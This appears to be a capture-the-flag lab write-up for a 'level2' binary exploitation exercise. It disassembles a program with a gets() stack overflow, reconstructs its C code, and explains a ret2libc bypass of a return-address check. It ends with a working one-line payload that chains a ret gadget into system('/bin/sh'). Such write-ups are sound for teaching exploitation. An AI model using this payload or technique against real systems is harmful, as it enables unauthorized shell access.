## Level2 - Ret2libc
---

### Steps to solve
- #### Use gdb to get the assembly of the program and tracking instructions.
    - #### Functions used in the program.
    ```c
    0x08048358  _init
    0x080483a0  printf
    0x080483a0  printf@plt
    0x080483b0  fflush
    0x080483b0  fflush@plt
    0x080483c0  gets
    0x080483c0  gets@plt
    0x080483d0  _exit
    0x080483d0  _exit@plt
    0x080483e0  strdup
    0x080483e0  strdup@plt
    0x080483f0  puts
    0x080483f0  puts@plt
    0x08048400  __gmon_start__
    0x08048400  __gmon_start__@plt
    0x08048410  __libc_start_main
    0x08048410  __libc_start_main@plt
    0x08048420  _start
    0x08048450  __do_global_dtors_aux
    0x080484b0  frame_dummy
    0x080484d4  p
    0x0804853f  main
    0x08048550  __libc_csu_init
    0x080485c0  __libc_csu_fini
    0x080485c2  __i686.get_pc_thunk.bx
    0x080485d0  __do_global_ctors_aux
    0x080485fc  _fini
    ```
    - #### Assembly of main function.
    ```c
    0x0804853f <+0>:     push   %ebp
    0x08048540 <+1>:     mov    %esp,%ebp
    0x08048542 <+3>:     and    $0xfffffff0,%esp
    0x08048545 <+6>:     call   0x80484d4 <p>
    0x0804854a <+11>:    leave
    0x0804854b <+12>:    ret
    ```
    - #### Assembly of p function.
    ```c
    (gdb) disas p
    0x080484d4 <+0>:     push   %ebp
    0x080484d5 <+1>:     mov    %esp,%ebp
    0x080484d7 <+3>:     sub    $0x68,%esp
    0x080484da <+6>:     mov    0x8049860,%eax
    0x080484df <+11>:    mov    %eax,(%esp)
    0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
    0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
    0x080484ea <+22>:    mov    %eax,(%esp)
    0x080484ed <+25>:    call   0x80483c0 <gets@plt>
    0x080484f2 <+30>:    mov    0x4(%ebp),%eax
    0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
    0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
    0x080484fb <+39>:    and    $0xb0000000,%eax
    0x08048500 <+44>:    cmp    $0xb0000000,%eax
    0x08048505 <+49>:    jne    0x8048527 <p+83>
    0x08048507 <+51>:    mov    $0x8048620,%eax
    0x0804850c <+56>:    mov    -0xc(%ebp),%edx
    0x0804850f <+59>:    mov    %edx,0x4(%esp)
    0x08048513 <+63>:    mov    %eax,(%esp)
    0x08048516 <+66>:    call   0x80483a0 <printf@plt>
    0x0804851b <+71>:    movl   $0x1,(%esp)
    0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
    0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
    0x0804852a <+86>:    mov    %eax,(%esp)
    0x0804852d <+89>:    call   0x80483f0 <puts@plt>
    0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
    0x08048535 <+97>:    mov    %eax,(%esp)
    0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
    0x0804853d <+105>:   leave  
    0x0804853e <+106>:   ret
    ```
    #### First the prorgam call `gets` function and pass a buffer to it, `gets` will fill the buffer from the input without any size limitation. 
    ```c
    0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax // ebp-76 address of buffer.
    0x080484ea <+22>:    mov    %eax,(%esp) // push the address to stack.
    0x080484ed <+25>:    call   0x80483c0 <gets@plt> // call gets.
    ```
    #### The next instructions is not clear let's jump to c code.
- #### Get the approximate code.
    ```c
    #include <stdio.h>
    #include <stdlib.h>

    int p() {
        char buffer[76];
        unsigned int ret_ptr;

        fflush(stdout);
        gets(buffer);
        
        ret_ptr = __builtin_return_address(0); // get the return address.
        if ((ret_ptr & 0xb0000000) == 0xb0000000) {
            printf("(%p)\n", (void *)ret_ptr); // 0x8048620 is a format string "(%p)\n"
            // (gdb) x/s 0x8048620
            // 0x8048620:       "(%p)\n"
            _exit(1);
        }

        
        puts(buffer);
        return strdup(buffer);
    }

    int main(){
        p();
    }
    ```
    #### We can see that the program checks the return address, so it doesn't allow us to overwrite it with addresses that start with `0xb0000000`.
- #### Detected vulnerability:
    - #### The vulnerability is Stack Buffer Overflow. This allows us to overwrite stack variables and control the return address, forcing the program to execute our payload.
    - #### By return to the assembly we can that there is exactly 76 between the start of buffer and the `ebp`.
        ```c
        0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax // ebp-76 address of buffer.
        0x080484ea <+22>:    mov    %eax,(%esp) // push the address to stack.
        0x080484ed <+25>:    call   0x80483c0 <gets@plt> // call gets.
        ```
        #### And we now know that the return address normally exists at `ebp+4`, so there are exactly 80 bytes between it and the start of the buffer. So we need to write 80 characters, then write our address of the shellcode or a win function.

        #### Actually, there is no win function in this program, so we can solve it in one of two ways: write shellcode somewhere and return to its address on the stack, or use the address of `system` with the address of its parameter `"/bin/sh"`.

        #### But how do we bypass the limitation check that blocks us from returning to a stack address? One way to bypass this check is to overwrite the return address with the address of a `ret` instruction `0x0804853e`. This way, it will return to itself, and the program will execute the `ret` instruction twice — but how can we benefit from this?

        #### When the program hits the `ret` instruction the first time, it will pop the return address from the stack and execute it. So the program will come back a second time to execute the `ret` instruction, but now the stack has a new return address, because the first one is gone. Here we put our own return address, and yes, the limitation check no longer applies.
        #### After the fake return address `0x0804853e`, I write the address of the `system` function, which is `0xb7e6b060`. When the program hits the `ret` instruction the second time, it will execute the address of `system`, which means calling `system`. Then the program will try to pass a parameter to it, which is the command to be executed.

        #### When the program looks for the parameters of any function that is called, it looks 4 bytes after the position of the function's address, because the position directly after the function's address is reserved for the return address that will be executed after finishing the call to this function. To satisfy this, we will write 4 a's, or any 4 characters, as padding between the address of the function and its parameters.
- #### Solution command
    ```sh
    (python -c 'print("a"*80+"\x3e\x85\x04\x08"+"\x60\xb0\xe6\xb7"+"aaaa\x58\xcc\xf8\xb7")'; cat) | ./level2
    ```

    #### address of ret instruction = `0x0804853e` in little endian `\x3e\x85\x04\x08`
    #### address of system = `0xb7e6b060` in little endian `\x60\xb0\xe6\xb7`
    #### address of "/bin/sh" = `0xb7f8cc58` in little endian `\x58\xcc\xf8\xb7`